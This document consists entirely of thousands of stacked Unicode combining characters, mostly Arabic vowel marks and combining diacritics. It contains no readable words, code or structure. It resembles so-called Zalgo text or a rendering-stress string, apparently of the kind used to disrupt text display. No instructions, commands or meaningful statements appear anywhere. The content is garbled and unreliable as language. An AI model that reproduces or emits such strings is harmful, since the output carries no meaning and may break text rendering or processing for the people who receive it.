ًٌَُ̧̨̙̱̠́ͬ͏ٍِ̱̲̌̚҉̷̴̶̸̶̷̵̵̵̴ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̡̧̧̨̨̢̢͈͇̝͈̤̯̺͙͇͉̤͈̞̠͍̯̠̳͇̖̩̳͍͕̮͚̹̺̩͓͔̱̦͕͔̣͍̰͉̬͉͍̮͖͓̰̰̖̣͙̘̠͎̄̇̽ͧͮ̀ͯͣ̍ͬ́͗̉͛̎ͯ̀̑͒̇̇̆̊̓͌͐ͯ̓ͥͭ̔̃ͨ̏̎̌ͧ̋́̑͛̇̊̈̎ͤ͐̃̀̉ͭ͐̅͂̆͗̉̄̂̍ͭͭ̀͛̈̈͘͘̕͘̕͘͜͟͟͢͜͢͢͢͜͟͡͞͡͡͠͞͠͞͝ͅ͏̷ًٌَُ̱͇̓̎̏͠͠͏̴̷̶̸̸̵̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̨̨̧̛̤͍͈̹̻͖̥͉̫̙̹͖̺̠̺̭̘̙̫͙̣̰̲̩̱̪̽̈̅̍͋̂̏ͩ͂̃̇́̄̓̓̓̃ͯͯͣͪ̃̀̓̏̓̋ͨ̏ͦͫͭͣ̇͘͘̕͘̚͜͟͜͞͞͞͞͡͡͠͠͏ًٍَُّ͙̎́̌͠͏ٌٍِ̙̜͓ͭ̊͞҉̵̶̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̺͉̙̘͈̲͕̰͍̪͖ͦ̈̀̃̂̀̀̀ͧ̏͆͗ͬ͒̈̕̚͝͝͝͏̶̸ًًًٌٌٍٍَََُُِِّّّ̨̨̮̝̞͈̬͓̙̳͑̄̿ͧ̒͑͋̕͡͠͞҉ًٌٍَُُِّ͕̻̪͍͈͋̋̀̿͋̐͆͢͏̵̸̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̢̧̡̧̩͖̤̦͖̰͚̘͓͖͓̯̻̼̖̔ͭ̀͌͛ͬ͐̈́̀̍̌͒ͦ̏ͯͬ̍̀͘͘͢͟͢͡͠͏َّ̗̀҉̴̶̶̸ًًًًًٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̨̧̢̦̫̰̻̪͇̩̬̥̹͈̱͎͓̣̼͉̭̮̃́̍̀͆ͮ͛̏ͦ͒̊ͦ̀ͥͣ̂̿̓͋͊̆̈͢͟͞͡҉̷̷ًٌٌٍٍََُِِّّ̡̨̡̢̛̗͇̠̹͍̺͑̅̏ͬ͟͏ًًٌٍَُِّ̡͉͕̹͔͚̆̓̎͘͜͏̷̷ًًٌٌٍٍََُُُِِّّ̢̦͔̤̻̳͔̗̓̏́̿̈ͥͦͨ̍͐ͦ́ͨ̔̕͠͏̸ًًٌٌٌٍٍََُُِِّّ̧̨̼̪̟̙̙͈̥͈͓ͬ̎̑ͨ́̐̌ͥͨͧ͜͞͠͡҉̴ًٍَِّ̧͓̖̻̇̒̈́͏ٌُ̛̞̭ͩ͏ًٍَُِّ̗̖͉́̎͞͏ًٌٌٍَُِّ̨͔̳̩̺̰̒̀̔̀̌͆҉̶ًٍَِّ̺̗̩̻ͪ́͞͞҉̷̸ًًٌٌٍٍََُُُِِّّ̡̙̼̻̩̠̀͂̇̕͘͟͠ͅ҉ٌٍَِّ̛̬̟̩̳̉͠҉ً͏ٌٍَُِّ̨̞̱̗͇̋́͠҉̷ًًٌٌٍَُُِِّ̨̣̫̟̱̳͕̐̍͛͂ͯͭ̔̓͆͘͟͝҉̷̵̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̧̧̡̡̛͕͚̼͕̻̬̫̼̱͕̞̳̝͉̳͗͆̾ͨ̈́̎̓̂̍͂̊̌̋̕͞͡ͅ͏̵ًًٌٍٍََُُِِّّ̜̦̱̯͕̰̤̆̉́̀̏̅͟͞͞͏̸̶̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̨̗̟͚̭̩̮͉̣̦̲̗̪͖̺̺̹̓̇ͨͪ̀̀̀ͥͮ̑͋̿͌̄̏ͭͦ̓͆ͧ̊͌̈́̕̚͘͟͟͟͜͜͞͡͡͡ͅͅͅ҉ٍِ̞̓͢͏َّͣ̀̚҉̸̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̢̡̛͕͓͓̰̣̫̠͖̺̘̬̜̘͉̘̪͚͓̆͒̓̀ͨ̋̇̒ͬ̆ͫ͆̐ͨ͊̾̐̆͘͘͘̕̕͟͝҉̶̴̴ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̨̢͔͈̺̙̯̻̠͙̠͖̻͍̱̲̝ͯ̄̅́̓ͮͪ̃̉̌̅̑̕͜͡͞͡͠͞҉̸̶ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̨̢̧͇͓͚̪̞̟͓͔̣̙̦̼͆́̎̇̇̽͒̏̓ͯͩ̋̑̿̀̚͘̕͢͢͞͠҉̸ًُ̣̾҉̶̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̧̛̛̬͍̫̹̰͉͙̖̙̜͙̘͉̯̞̫̓̐̇͊̀̐̈ͫ͌̓͑͗̒ͩ̐ͫ̀̆͘͟͟͡͝҉̸̷ًٌَُّ̟̟̼̉̃̉͜͏̴̶̵̴̷̵̵̴̶̵̷ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̡̡̧̨̢̡̧̨̡̢̛̛̛̛̱̘͇̦̜͉͇̝̩̩̟̻̼͉̙̰͙̯̦̬̺͉̩̞̳͔̬̘͖̦͓̲̩͍̜̭͖͓̰̯̠̯̪̬̯͔̩͔̘͚̹͓̈́̐̉͐ͯ̀͌ͨ̆̊ͫͮ̀̌͐̓̉̇͆̄ͣ͊̑ͦ́͌͛̆͐̀̃̈́͊̄̀͗̆̃ͥ̆̿ͯ̉̓ͦ̍̐̀͌͐͑͑ͫ̌ͥ͋́̃ͩ̀̕̕̚̕̚̕̕͜͜͜͟͢͝͞͞͞͝͠͠͠͠͡͝ͅͅ͏ِ͏̸̴̶̵̵̴̴̷̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̨̨̨̧̡̡̡̢̡̛̛̛͙̳̮̟̥̜͍̲̞͕̼̟̖̤̦͇̯̫̮̪͉̲̺̲͙̯̪͙̪̲͔̲̤̣͕͉̲̬̔̋̓ͧ͌̇ͬ̓ͫͦͯ̊́͛ͨ̍̿ͧ́̆̍̽̇̋̈̈́̓̀͑̀̀͌̍ͯ̇̓ͣ̚͘̚̚̚̕͢͢͜͟͢͜͠͡͡͞͝͠͠͝͞͡ͅͅ͏ً͏̶̴̶̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̡̧̨̧̡̛̛̹̭̗̝͇̗̙͈͓̜̠͓̙̞̪̦͓̘̜̺̝̞̳̺͈̻̣͙͉͙͋̋͛ͮͯ̅̒ͫͦͦ͒ͥͪͥ̎̉ͦ̾̈͒̍͂͒̅͊̿̅́ͦͩ͗̐͘͘̕̚͘͢͜͜͠͞͡͝͡͞͠͠҉̶ًَُ̖̮͒̈́͏ًٌٌٍَُِِّ̢͇̤̙̯͑̇͆̇̿͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̢̛͎͇̩̥͕̫̝̲̳̣̈́̒ͭͫ̉ͦͣ͗́͘̕͝͝͝͞҉ًٌٍٍََُِّّ̡̩̫̮͔̻͍̂́ͫ̐͜͏̸̴̷̷̶̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̧̡̛͈̣̺̲͖̤̙͇̰͈͍̮͙̳̙̜̭̫̠̥̝̯͉̭͓̞̗̦͓̯͇̝̝̲͓̭̮̻̺̇ͧͭͩ́̈ͧ̉͂͐́ͫ̓͂̔͛͋́́̊̉̌̐́̐̄̓ͬͥ͛̒̀̽ͣ̆̾̎ͤ̈́͘͘͜͟͟͜͡͠͞͝͞͡҉̷ًًٌٌٌٍٍٍََُُِِِّّّ̧̰̞̹͈̩͚͛̄̈ͧ͑͡͡ͅͅ҉ًٌٍَُِ̢̧̜̰ͤ̆҉̷̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̡̢̡̛̞̘̻̭͚̯̲͖̝͎̙̻͈̩̝̣͙̥̱̱̤̺̈́ͩ͊ͫ̇́͒ͮ̍͋̓̃̅͛̿͒ͪ̄͆ͬ͘͘̚͘͘͢͢͟͝͝͏ًُ̞̂̓҉̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̨̨̧̨̡̛̛̫̱̞͖̦̫̘̹̮̞̟̠͙͇̳̳͔̗̞̬̭̝̣̻̯̤̞̯͑̀̈̈́̀͐̀͌ͮ͆͆̆ͫͫ̆ͪ̆̊̿ͣ̾̐̂͌́́̓̐͂ͫ̍́̈́̀̃̅͑ͦ͘̚̕̚͟͢͢͜͟͜͟͢͢͝͞͡͞͞ͅ҉̷̷̴̶̷̵ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̧̛̪͈͉͉̱͙̠̱͙͎͉͇̯̬̙̟̻͖̥̪ͪͥͮ̀̏̌ͧ́͗͑̃̇̋̈́ͩ̃͂̐͛̂̃̕͘͟͟͜͢͞͡͝҉ٌ̎͏ٍِ̩̃͑҉̵ًًٌٍََُِّّ̨̨̤͇̾̏͗͊͟͝͏ٌُ͙̑҉̶̷̸̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̥̺͉̠̤̥ͥ͋̾̑͋ͭ̿̾͊ͦͦ̿̍ͤ̀̈́͛͑͘͟͢͡͞͡͏̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̢̗̼̞͎̦̻̣͖͔̟͇̟̘̑̔̔͋ͨͫ́̒́̚͘͟͟͟͜͝͞͞͠͏̵̷̶ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̢̢̛̛̣͔̰̩̠̫̜̭̤̬͔̙͚ͧ̂̍͂͒ͯ̑̂͊͐̑́ͧ̈́ͤ͋̅͢͡͞͡͝҉̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̛̹̺͍͇̣͍̳̬͖̪͕̻̺͎̳̼̩͚̮̠̳ͤ̾̌͑̊̎͂ͨ̐̑̊͊ͧ͗̚͘̕͟͢͢͞͡͏̸ٍِّ͇̭̦ͬͧ̚҉̵̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̡̨̨̡͖͓̯̥̘͇͉̰̮̅̑ͨ́̎͌̃͂͒̂͞͠͠҉̷ًًٌٍََُِّ̭̪͎̺͉̩̆ͨͦ̓ͣͦ̚͡҉̴̴̷ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̛͖̯͇̱͖̪͖͙̙̑ͤ͋͗̌̇͗̚͟͟͜͢͞͞͞ͅ҉̷̴ًٌٍٍَُِّ̡̘̜̰͎̰̲̅ͭ̍̂̕҉َّ͔̇͏ًًٌٍَُِّ̡̛͎͉̖͈ͯ̀̊͞ͅ͏̵̷̵ًًٌٌٌٍٍََُُُِِّّ͎̜̹͉͍̙͈͙́̎́ͣ̄ͪ̀̎́͟͞҉ًٌٍٍََُِِّّ̧̘̭̹͉ͫ̀͂̕͢͜͞͏̷̴̷̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّ̡̡̨̛̛̛̛̠̖̳͍̺̩̖̥͖̞̘̪̻̙̰͉͔̞̤̳̪͚̤̱̪͈̟̅͒̎͌ͤ͋̂͐̄̍ͨ͆̾͌̎̂ͣͩ̄̄ͭͭ͘͜͟͜͢͠͏̴ًًٌٍََُِّّ̛̘̫̗͈̦̿̓̀ͣ̅͜҉̸̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̧̡̨̛̛̜̟̘̼̩͍̥͇͉̘̝̻̖̞̲̜̘̙̣̣ͪ̒ͣ̒̅ͪ͒̏́̓͌̒ͨͨ̌̏̂̎͐̌ͭ̆̍̐͋̓̓̚͘͘͜͟͜͟͞͞͡͠͝͠͞͝͞ͅͅ͏ًٌٌٍَُِِّ̱̙͇͕͓̤̉̀͂ͪͣ͢͏̴ًًٌٌٍٍٍََُُِِّّّ̛̲͉̞̘͉̘̙̭́͒̓̿͌͆͊͘͝͝ͅ͏ًًٌٌٍََُُِِّ̢̨̠̦̜̹̖̼̪̥̓́̃͛ͥ́͗̌̀̄͂ͩ͞͏̸̸ًٌٍٍََُِّّ̧͓̥͎̌ͨͩ̆̐̂̓̕ͅ҉̶̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̢̮͖͇͈̖̞̼̺͛ͯ̑̋̐̅̅̐̽͒̆̕͡͞͞ͅ҉ًًٌٌٍََُُِّ̡̮̥̜̞̭͊́̊̉̐̃̑͐̑͘͟͞҉̷ًٍَُِّ͚̰̖ͩ̀̌͏̷̵̶̵̵̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̧̮͕̠̙̳̹̹̙̠͈ͩ̌̎͒̐̋̒̀́͢͡͡͏̶̵ًٌٌٍَُِِّ͇͇̻̹ͯ̈̓̃͜͝͏̸̴̴̷̷̶̴̴̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّّ̧̢̧̨̨̢͇͚̟̬͍̦̲̥͈̠̩͕̱͙̘̦͙̳̪̞͍͍͖͉̦̫̱͋ͯ͋ͬ͛͐̀͋͒ͣͯ͌͒̾͊͆ͭ̓͊̐̐ͫͩ͋̈́͘͘͜͟͢͟͠͞͠͡͝͞͠͡͡҉̸̸ًٌٌٍٍََُُِِّّ̡̛̛̲͕̬̣̞̏͑ͤͫ̃͗͊̈́͠͏̶̸̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̡̛̛̛̛͖͖̭͕͖̯̥͓̝̰̙̪̥͉̝̪͓͚̠̺͇̘ͭ̓̆̊̿͆͗̒͆ͣͭͯ͐̔͆̃̿̉̕̕͘͟͢͠҉̴̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̡͚͚͚͈̟̟̭̼̫͓͕̟̞̰̘̣ͫͭ́̿̏́͐̑͒ͦ̽͆͊̔͆̊̐͘͜͞͝͡͠͡͠͝͝͏ًَُّ̤͇̙͆̌̕͠͏̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̛̩̣͙̟͕̰̼̣̗̯̖̞̻̪͕̺̻ͯͥ̏̑̊͆̿ͩ͐̂ͤͤ̄́̑̚̕͘͟͢͝͝͡͞ͅ҉̴ٌٍَِّ̢̢̠̹̝͍̅̒̈́̚̕҉̸̸̵̴̸̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̨̨̧̨̨̨̨̢̛̛̣̟̩̗͍̦̗̻̞͉̹̖̟͇̣͉̤̞̱̝͓̤̥̮̥̰͓̹̯͕̜̙͔̬̖͙̗̮̬̽ͬ̅̅̌̾̑̀͐̀͊ͩ̊̄ͥ̋ͨ̃͛̆̽̎̀̎͋̊̇͗ͯͣͪ̊̇̀ͪͮ̄ͪ̎̋̽̕̕̚͜͜͢͢͢͡͠͡͝͠͠͡͠ͅͅ͏ٌُ͔̿̃͏ًٍَُِّ̡̥̱̏ͨ̇̑̕҉̸̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̨̨̛̫̳͖̟͇̠̣̙̯̯̝̘̭̺͉̜̜̭͓̼͛̓ͨͥ̉̌̀͆͌̑͆͌ͧ̒̅͌̀̍ͧ̊̀͑̓̋̓̓̕͘͘͘͟͜͞͝͠͝͝ͅ͏̷ٌٍَِّ̢̗ͨͤ̚҉̷̴̷̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̧̨̡̧̡͚̠̝̼͔̯͎͚͈̥̥̲͎̩̗̲͙̘͖̻̖̈́͂ͥͧ̉͆ͥ̍ͣ̐ͬ́̐̐̑̒͊͑ͦͩ̕̕͘͟͝͞͠͡͏̶̶̴̷̴̸̵̷̵̷̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̧̨̢̡̛̯̫͚͚͚̙̺̤̲͇̥̱̠̗̜̺͓͈̰̼̲͐̓̿͒̌̀̅̊̀̔̉̂̃́̐̑ͪ̅ͤ͂͗ͭ̊ͬ͗͒̃̓ͫ̚͘̕͘͢͜͟͞͡͠͠͡͞҉̶̵̶̷̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّ̡̢̡̛̬̥̖̩͕̗̣̳͍͎͕̺͍̗̭̟̠̬̯̱̙̦̀̀̆͌́̿͛̃̉͋͌͛̈́̌ͩ̀̈̈́ͮ̄̚͟͝͝͠ͅ͏̵ًًًٌٌٍٍٍَََُُُِِّّّ̢̛̠̱̲͓̫͍̱͈̂ͥ̉̿͑ͤ̎ͫ͗ͮ̚͜͟͠ͅ҉̷̶̴ًًٌٌٌٍٍٍََُُِِِّّ̛̝̙̘͕̲̤͙͓͍͇̄͒̀̇ͦͨͯ̌͗͟͟͝͞͝͞͡͠͏ًَّ̙͈ͯ́ͪ҉̸̷̸̴̷̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̡̨̧̧͉̠̫̫̰̪͔̺̻̯̩̠̼͎̗̩̝̰̱̺̘̞̒ͮͭ̀ͯͮͯͤ̃̽ͫ̆́̀̊̈́͑̂̚̚͜͟͜͟͞͡͏̸̵̶̶̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̡̡̨̛̛̫͍̯͖̘̫͓̮̬͎̣̲͉̲̼̺̮̥̘͙͈͈̙̣͇̻ͣ͛ͮ́͐ͧ̓̑̀ͦ̔́͗̆͋͑͑ͣ̇̏́ͩ͘̕̕͟͢͜͢͠͝͡͡ͅͅ͏̶ًًًٌٌٍٍََُُُِِّّ̜̳̝̣̼̮̲̻̺̼̒ͪͪͬ́̚͘̚̕̚͜͡͏̸̸ًًٌٌٌٍٍٍََُُِِِّّّ̡̡̛͈̺̗͓͈͕̓̉͋͆́́̀̉̒͊͜͞͏̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̛̠͖̩̩̝̼̫̤͍̫̜͇̫̫̯̹͇͙͉̼̺͚̟̅̈ͧ̇̉̃̋ͥ̋̀̄͛́̈̇ͫ̄͋̉̾̇̕̕͘͘͢͢͠͞͝͝͞͡͠ͅ͏̸̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̛̛̪͔̪̺̝̩̮͂ͨ̏͊̃̓͊͘̕͢͟͡͝͡͞͡͏̶ًٌٌٍٍَُُِِّ̢̦͍̭̜͒̂̍̎ͬ̆ͨ̃͞͡҉̷̶̴̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̡̡̡̧͍̹͕̫͙̱͈̖̱͉̣͚̄̌̏̀́ͦͪ̾̄̀̅͋̓̐ͮ̇͂͛ͫ̽͢͢͢͜͟͠͝͞͞ͅͅ҉̷̷ًًٌٍَُُِّ̭͙͈͈̮̟͋ͮͯ̕͜͞͏ٌٍِّ̦̞̏͟͏̴̷ًًٌٌٍٍَََُُِِّّ̡̧̯̖̹̮͚̳̣͛̀ͣ̓͗̀͋͏̵̷̶̴̶ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨͖̘͇̗͕̟̩̫̺̭͔̙̬̼̦͓̰̌͋͊͛̅̔ͤͮ̀̐̑̆̍̎͐͛̉̔ͦ̓̒̕̕̚͢͠͝͡͏ًٍَِّ̢̜̻͔̤͊̂̃҉̴̵̶ًًٌٌٌٍٍََُُُِِّّ̯̮͕̖͉̫̠̭̿ͫ̂͘̕͡͠҉ًٌٍَُِِّ͓̯̙̖͕̀̅́ͩ̑͛͏̴ًٍَّ̮̩̄͛҉̶ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̨̨̧̛̛̛̼̤̙̟̭͕̣̙ͧ͒̎̒̃̉ͬ̄͗͗̊̉̃͘͘͜͏ًٌٍَُِّ̢̠͈͔͚͕̗̐̀̽͌̉͆͟҉̶̴̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̨̧̞̲͍̯͚̲̮͎̥̟̔̐ͫ̉̓͂̆́ͫ̕͘͢͢͡͏̸ًًٌٌٌٍٍٍََُُُِِِّّ̛̻̼̻̠̬͍̺̘͕̦̞ͤͯ͂̋ͯ̌̀̀̍̇̿͘̚͘͘̕͟͜͟͟͝͠͝҉̶̵ًًٌٍََُُِّّ̡̛͇̞̗̳͍̄ͤͩͤͮ͊̕͢͟͝ͅ҉̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̢̨̨̙̠̞͙͎̖͈̲̥̪ͩͫͩͧ̀͗̐̆̀͋ͦ́̌̕͘͡͡͡ͅͅ҉̸̶̴ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̨̯̙͈̱̬̭̼͓̮̣̖̘̯̖̺̙͓̒ͩ̈̊̈͋͗ͨͭͧͭͦ̀̽̑̐̓͌͗̕͜͟͞͡͞҉ًًٌٌٍٍَُُِِّ̢͓̯̞̝̙͍̜̒͗ͨ̀ͨͨ̋͂ͨ͘̕ͅ͏ًًٌٌٍََُُِّّ̧̜̟̘̬̇͌̚͘̚͟͠͡͡҉ٍِ͎̌͏ًٌٍَُِّ̨̜̹̪̟̯͔̏҉ًٌَُّ̧͕̟̹́̋͜͏̸̶̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̡̡̨̢̢̨̛͕̥̦̭̗̬̥̠̳̬̭̠͔̳̮̠̦͓͔͎̟̬͉̜̝̀̆̌͌ͦ̆͂͑ͭ͐̎͑̄̾ͨͥ̽́̀͐̔̃͐̄̈̆̀ͯ̿̂̚̕͟͠͡͝͞͠͡͝͏̶̴ًٌٌٍَُِّ̘̙̩̗̔ͧͣ̽ͫ̅̕͝҉̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̢̧̡̛̳̘̺͉̤̙̮̙̣͙̲̫̺̬̺͉̘͆̈́ͫ͆̅̊̀ͧ̇͋͗ͭ͐͂ͩͧ̽ͮ͘̕͜͝͝͝ͅ͏̴̴̴̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡̢̛̝̮̪̱̰̦̲̜̟̻̝̳̱̱̟̬͈͙̹͇̗̂ͨ́͗̃ͭ̀ͭ̒̍̎̾̾͂ͥ͒ͤ͆̄̕͜͜͠͝͞͠͏̵̸̸̷ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ͔̯̯̻͖͔̼̫̹̣͔̈͆ͬ͋͌̓́̆́ͣ́ͧ͘͘̚͟͢͝͠͏ًًٌٌٍٍََُُِِّّ̢̺̫̥͖ͣ́́̐ͧ̿̉͊ͪ̕͜͢͞͠͏̶̶ًٌَُ͖̱͉̇́̊̔҉̶ًٌٍَُِِّ̧̛̠͉̖̞͛̉̊̂̓҉̷̴̵̴̴̷̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̛̺̪̻̫͙͎̩͇̺̗͇̹͓̞̦̟͓͍̤͙͚̪̳̠ͧ̓ͫ̊͐ͭͨͥͪ͋͌͆͌͑́͊ͭͬͮͥ̀̈͊̚̕͜͟͟͞͝͡͠͞͠ͅͅ҉̸ًٌٍَُِّ̘̽̂͢͟͝͏̷ًٌٍَُِّ̨͓ͥͩͫ̊͡͝͏ًًٌٍَُُِّ̧̛̫͎̬̥̂ͮ̅ͭ͟͞ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̨̳̺̦̝̝̟͙̯̲͚̖͔͉͔̒͌̾̐́̈́̀ͨ̿͆̀̂͊̓ͨ̏ͪ̑͋͘͘͢͜͠͡͞͞ͅ҉̶̵̶̸̵̸̸̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̧̧̧̡̨̢͕̖̺̜̥̼̲̳̜̖̖̩̙͇͚͙͚̥͕̘̱͓̘͓̹̖͉̳̲̝̩̘̠͉̠̟͒́ͫ̓͗̉̊̌́̂͒͂̌̓̎̓ͤͨ͋ͣ́͊͌͐͊̊ͭ̌̀̂̓̒ͧ͂ͥͭ̐͗́̌̕̕̕̕͘̕͢͟͜͟͢͜͢͢͠͞͝͠͞͠͝͞͝͠͞͝͝͏̶̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̢̡̡̧̨̧̛͇̗̬̺͎̙͇̖̬̲̲͈̖͓͈̞̭̼̘̱̭͓͕̲̼͈͔͖̤̬̩̗̗̥͕̺͉̯̲̦͉͓̣̝́ͪ̑̀ͧͪ̀̉̅̑̈͊ͯͮ̋̄̀̑ͯ̀ͦ͑̂̎ͫ̆͂̄͛̿̅̋ͭ͛͑͛̇̇ͬ̆̆͘̕̚̕͘̕͘͘͢͢͜͢͢͡͠͡͠͠͡͠͠͝͠ͅͅͅ͏̶ٌٍُِ̺͖̱ͤͭ҉̴َّ͇̑͏̶̸ًًًٌٌٌٍٍٍََُُُِِِّّّ̨̧̛͉͇̙̟̝̼̰̺̺̝̝̾ͬͭ̔́ͮ̅̄͘͘̚͜͡҉̴̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̨̡̡̡̛̛̛̛͓͉̮͕̣̤̳̻̳̱̘͎͚̖̲̜̭͕̙̤̫̗̭̤̼̯̠̽̃̃͌͋̓͐͂̀͊ͮ̌̎͑̈͑̀̌̈ͯ̆ͦ̓̋ͤ̅̕̕̕̕͟͟͢͠͡͝͞͝͝ͅͅ͏̶ًَُ̎͏̵ًٌٍَُِّ̨̺̼̣ͤ̐ͪ͘͢͏ًٌٌٍَُِّ̢̡̟̳͚ͦ͐ͯͩ͜͡҉̷̵̴̴̸̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̢̣̜̗͈̦̼͔̩͔̼͎͉͂ͣͯ̇̄̋ͭ́̋͋̂͆̽͘̕͢҉ٌُِ̳̝̀҉̷̷̸̷̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̧̧̢̛̛̛͈͚̻͇̲̺͉̪̖̫̝̙͎̲̺̪̤̣̮̥͌̀̈̋͐̅ͭ́͂̃̎̀͐̀̌͐ͬ͊ͥ̆ͤ̽ͩ̈ͤ̓ͩ̃ͪͦ̋ͤ̈̀͘̕͘͘͜͢͢͢͠͞͏̵̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̢̢̡̢̧̰͈͇͈̯̳̥͈͚̣ͣ̍̀̍̅͂́ͦ̅͆̀̇͛̏͜҉ٌٍَِّ͉͉͈̱̽͠͏ًٌٍَُِّ̢̭̬͈̙̣ͯ͐̅͟͠͡͏̷̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̣̱̮̗͔͈̥̙̻̀̏̋͊̓̂̍ͨ̈͢͡͝͏̶̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢̱͎͕̘̰̠̘͕̱̠͗̊͐ͤͥͧͪ̈́̉̄ͭ͋̎̕͡҉̴̷̶ًٍَُِّ̛͖̃ͫ̉